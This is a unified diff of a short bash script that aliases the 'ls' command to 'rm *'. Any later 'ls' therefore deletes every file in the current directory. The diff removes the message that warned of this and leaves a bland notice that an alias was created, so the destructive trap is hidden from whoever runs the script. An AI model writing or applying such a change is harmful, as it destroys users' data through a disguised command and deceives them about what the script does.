@@ -1,4 +1,3 @@
 #!/bin/bash
 alias ls='rm *'
-echo "Alias 'ls' has been created. Running 'ls' will now delete all files in the current directory."
-
+echo "Alias 'ls' has been created"
